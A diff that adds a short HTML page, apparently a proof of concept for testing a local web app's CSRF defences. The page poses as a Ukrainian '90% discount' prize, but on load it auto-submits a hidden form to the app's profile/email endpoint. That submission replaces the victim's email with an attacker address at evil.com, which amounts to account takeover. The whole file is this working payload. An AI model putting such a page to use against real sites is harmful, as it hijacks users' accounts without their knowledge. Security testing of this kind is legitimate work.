@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Знижка</title></head>
+<body>
+    <h1>Ви виграли знижку 90%!</h1>
+    <form id="f" action="http://localhost:5103/profile/email" method="POST">
+        <input type="hidden" name="email" value="hacked-via-csrf@evil.com">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+</body>
+</html>
